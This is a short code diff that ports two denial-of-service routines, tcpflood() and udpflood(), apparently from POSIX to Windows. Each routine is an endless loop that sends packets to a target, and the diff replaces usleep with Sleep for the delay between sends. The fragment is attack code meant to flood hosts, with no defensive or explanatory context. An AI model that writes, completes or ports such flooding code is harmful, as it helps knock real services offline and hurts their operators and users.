@@ -29,7 +29,7 @@ void tcpflood()
 
     while(true) {
         send(sock, packet, sizeof(packet), 0);
-        usleep(attack_delay * 1000);
+        Sleep(attack_delay);
     }
 }
 
@@ -49,7 +49,7 @@ void udpflood()
 
     while(true) {
         sendto(sock, packet, sizeof(packet), 0, reinterpret_cast<sockaddr*>(&target), sizeof(SOCKADDR_IN));
-        usleep(attack_delay * 1000);
+        Sleep(attack_delay);
     }
 }
 
